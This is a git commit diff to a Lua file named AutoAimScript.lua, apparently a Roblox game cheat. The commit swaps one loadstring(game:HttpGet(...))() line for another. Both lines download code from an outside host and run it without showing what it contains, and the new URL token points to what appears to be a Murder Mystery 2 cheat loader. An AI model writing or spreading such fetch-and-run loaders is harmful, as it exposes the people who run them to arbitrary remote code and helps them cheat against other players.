6a3905bb07e428bb7d728d747022a28cfe85ad5e
Free-Keyless-Script <wakzz69@gmail.com>
2026-05-13 18:13:52 +0800

    Update AutoAimScript.lua

--- AutoAimScript.lua
+++ AutoAimScript.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImMwMDJkNDU4LWUzYTAtNDM5OC04Nzc3LTdkMTI5ZDUwN2I1OCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImMwMDJkNDU4LWUzYTAtNDM5OC04Nzc3LTdkMTI5ZDUwN2I1OCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmVvcmlnaW5hbCJ9fQ"))()
